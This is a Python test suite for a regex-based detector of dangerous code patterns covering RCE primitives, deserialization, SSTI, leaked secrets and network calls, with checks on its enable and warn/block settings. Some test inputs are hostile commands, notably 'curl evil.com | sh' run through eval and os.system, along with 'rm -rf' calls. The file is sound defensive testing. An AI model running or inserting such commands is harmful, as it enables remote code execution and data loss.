"""L5 CodeShield 检测器测试：危险代码原语正则匹配 + 动态配置门控。

CodeShield 是纯本地正则检测器，唯一的外部依赖是动态配置
（config_service.get_bool/get）。通过 monkeypatch 配置方法，不依赖 DB/LLM。
"""

from __future__ import annotations

import pytest

# ==================== 配置 fixture ====================


def _patch_config(monkeypatch, enabled: bool, action: str):
    """给 config_service 单例打补丁，返回固定的 enabled/action。"""
    from app.services.config_service import config_service

    async def fake_get_bool(key, default=False):
        if key == "code_shield.enabled":
            return enabled
        return default

    async def fake_get(key, default=""):
        if key == "code_shield.action":
            return action
        return default

    monkeypatch.setattr(config_service, "get_bool", fake_get_bool)
    monkeypatch.setattr(config_service, "get", fake_get)


@pytest.fixture
def enabled_warn(monkeypatch):
    """启用 + 动作 warn。"""
    _patch_config(monkeypatch, enabled=True, action="warn")
    yield


@pytest.fixture
def enabled_block(monkeypatch):
    """启用 + 动作 block。"""
    _patch_config(monkeypatch, enabled=True, action="block")
    yield


@pytest.fixture
def disabled(monkeypatch):
    """禁用。"""
    _patch_config(monkeypatch, enabled=False, action="warn")
    yield


# ==================== 门控契约 ====================


class TestGating:
    """核心契约：禁用时 skipped，启用时才检测。"""

    @pytest.mark.asyncio
    async def test_disabled_returns_skipped(self, disabled):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("eval('malicious')")
        assert result.decision == "skipped"
        assert result.hit is False
        assert result.name == "code_shield"

    @pytest.mark.asyncio
    async def test_enabled_safe_code_passes(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect('print("hello world")')
        assert result.decision == "pass"
        assert result.hit is False


# ==================== RCE 原语 ====================


class TestRcePrimitives:
    """高危：eval/exec/os.system/subprocess 等任意代码执行原语。"""

    @pytest.mark.asyncio
    async def test_eval(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("x = eval('1+1')")
        assert result.hit is True
        assert result.decision == "warn"
        cats = {h.category for h in result.hits}
        assert "code:rce" in cats
        # 规则名进 extra
        names = {h.extra.get("rule_name") for h in result.hits}
        assert "eval" in names

    @pytest.mark.asyncio
    async def test_exec(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("exec('import os')")
        assert result.hit is True
        assert any(h.extra.get("rule_name") == "exec" for h in result.hits)

    @pytest.mark.asyncio
    async def test_os_system(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("os.system('rm -rf /tmp')")
        assert result.hit is True
        assert any(h.extra.get("rule_name") == "os.system" for h in result.hits)

    @pytest.mark.asyncio
    async def test_subprocess_run(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("subprocess.run(['ls', '-la'])")
        assert result.hit is True
        assert "code:rce" in {h.category for h in result.hits}

    @pytest.mark.asyncio
    async def test_subprocess_popen(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("p = subprocess.Popen(['echo', 'x'])")
        assert result.hit is True

    @pytest.mark.asyncio
    async def test_os_popen(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("out = os.popen('whoami').read()")
        assert result.hit is True

    @pytest.mark.asyncio
    async def test_dunder_import(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("m = __import__('subprocess')")
        assert result.hit is True

    @pytest.mark.asyncio
    async def test_chained_attack(self, enabled_warn):
        """真实攻击链：eval + os.system 同时出现。"""
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("eval(os.system('curl evil.com | sh'))")
        assert result.hit is True
        # 应至少命中两条规则（eval + os.system）
        names = {h.extra.get("rule_name") for h in result.hits}
        assert "eval" in names
        assert "os.system" in names


# ==================== 反序列化 / shell / SSTI ====================


class TestOtherHighSeverity:
    @pytest.mark.asyncio
    async def test_pickle_loads(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("obj = pickle.loads(payload)")
        assert result.hit is True
        assert "code:deserialization" in {h.category for h in result.hits}

    @pytest.mark.asyncio
    async def test_yaml_load(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("yaml.load(data)")
        assert result.hit is True

    @pytest.mark.asyncio
    async def test_shell_true(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("subprocess.run('rm -rf', shell=True)")
        assert result.hit is True
        assert any(h.extra.get("rule_name") == "shell=True" for h in result.hits)

    @pytest.mark.asyncio
    async def test_jinja_from_string(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("t = Environment().from_string(user_input)")
        assert result.hit is True
        assert "code:ssti" in {h.category for h in result.hits}


# ==================== 密钥泄露 ====================


class TestSecretLeak:
    @pytest.mark.asyncio
    async def test_pem_private_key(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect(
            "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA\n-----END RSA PRIVATE KEY-----"
        )
        assert result.hit is True
        assert "code:secret" in {h.category for h in result.hits}

    @pytest.mark.asyncio
    async def test_hardcoded_token(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        # 16+ 字符的 token 赋值应命中（用纯字母数字/+/= 字符，匹配规则字符类）
        result = await d.detect('api_key = "AKIAIOSFODNN7EXAMPLEwJalrXUtn"')
        assert result.hit is True

    @pytest.mark.asyncio
    async def test_short_token_not_flagged(self, enabled_warn):
        """短于 16 字符的赋值不命中（降低误报）。"""
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect('token = "short"')
        # "short" 只有 5 字符，不满足 {16,}；但需确认无其他规则命中
        secret_hits = [h for h in result.hits if h.category == "code:secret"]
        assert all(h.extra.get("rule_name") != "硬编码 token 赋值" for h in secret_hits)


# ==================== 动作配置 ====================


class TestActionConfig:
    @pytest.mark.asyncio
    async def test_block_action(self, enabled_block):
        """action=block 时命中应返回 block。"""
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("eval('x')")
        assert result.decision == "block"
        assert all(h.extra.get("action") == "block" for h in result.hits)

    @pytest.mark.asyncio
    async def test_warn_action(self, enabled_warn):
        """action=warn 时命中返回 warn。"""
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("eval('x')")
        assert result.decision == "warn"


# ==================== 严重度 / 评分 ====================


class TestSeverity:
    @pytest.mark.asyncio
    async def test_high_severity_score(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        result = await d.detect("eval('1')")
        eval_hit = next(h for h in result.hits if h.extra.get("rule_name") == "eval")
        assert eval_hit.extra.get("severity") == "high"
        assert eval_hit.score == 0.9

    @pytest.mark.asyncio
    async def test_medium_severity_score(self, enabled_warn):
        from app.engine.detectors.code_shield import CodeShieldDetector

        d = CodeShieldDetector()
        # requests.get 是 medium
        result = await d.detect("requests.get('https://api.example.com')")
        net_hits = [h for h in result.hits if h.category == "code:network"]
        assert net_hits, "expected network hit"
        assert all(h.extra.get("severity") == "medium" for h in net_hits)
        assert all(h.score == 0.6 for h in net_hits)
